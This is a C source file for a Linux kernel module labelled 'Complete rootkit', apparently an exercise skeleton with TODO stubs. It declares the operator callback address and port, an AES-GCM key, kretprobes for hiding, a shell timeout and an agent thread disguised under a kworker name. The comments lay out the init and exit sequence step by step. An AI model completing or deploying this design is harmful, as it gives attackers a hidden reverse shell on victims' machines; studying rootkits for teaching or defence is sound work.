// SPDX-License-Identifier: GPL-2.0
//
// Complete rootkit: module lifecycle with goto-rollback init.
//
// Parses the hex key, sets up AEAD crypto, initializes target lists,
// registers hiding kretprobes, and spawns the callback agent thread.
// No socket is created here; the agent connects outbound on its own.
//
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/random.h>

#include "rootkit.h"

// TODO: Declare all 6 module parameters:
//   control_key (charp): hex-encoded 256-bit key
//   peer_port (ushort): operator port, default 4444
//   peer_address (charp): operator IP, default "127.0.0.1"
//   retry_base_ms (uint): initial retry delay, default 1000
//   retry_max_ms (uint): max retry delay, default 60000
//   shell_timeout_ms (uint): shell command timeout, default 30000
static char *control_key;
module_param(control_key, charp, 0);

unsigned short rk_peer_port = 4444;
module_param_named(peer_port, rk_peer_port, ushort, 0);

char *rk_peer_address = "127.0.0.1";
module_param_named(peer_address, rk_peer_address, charp, 0);

unsigned int rk_retry_base_ms = 1000;
module_param_named(retry_base_ms, rk_retry_base_ms, uint, 0);

unsigned int rk_retry_max_ms = 60000;
module_param_named(retry_max_ms, rk_retry_max_ms, uint, 0);

unsigned int rk_shell_timeout_ms = 30000;
module_param_named(shell_timeout_ms, rk_shell_timeout_ms, uint, 0);

// Shared AEAD transform
struct crypto_aead *rk_tfm;

// Key material
static u8 rk_key[RK_KEY_LEN];

// Agent kthread handle
static struct task_struct *rk_thread;

static int rk_parse_key(void)
{
	// TODO: Validate control_key length is RK_KEY_HEX_LEN,
	// hex2bin into rk_key, then memzero_explicit the parameter.
	return -ENOSYS;
}

static int __init rk_init(void)
{
	// TODO: Complete init with goto-rollback chain:
	//
	// 1. rk_parse_key()
	// 2. crypto_alloc_aead("gcm(aes)", 0, 0)
	// 3. crypto_aead_setkey(rk_tfm, rk_key, RK_KEY_LEN)
	// 4. crypto_aead_setauthsize(rk_tfm, RK_TAG_LEN)
	// 5. Zero the raw key copy (it is baked into the TFM now)
	// 6. Initialize all 4 target lists
	// 7. rk_filter_init() to register hiding kretprobes
	// 8. kthread_run(rk_agent_thread, ..., "kworker/u8:3")
	//
	// Goto labels: fail_filter, fail_tfm, fail_key
	return -ENOSYS;
}

static void __exit rk_exit(void)
{
	// TODO: Reverse of init:
	// 1. rk_uncloak_module()
	// 2. kthread_stop(rk_thread)
	// 3. rk_filter_cleanup()
	// 4. crypto_free_aead(rk_tfm)
	// 5. memzero_explicit(rk_key)
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Complete rootkit");
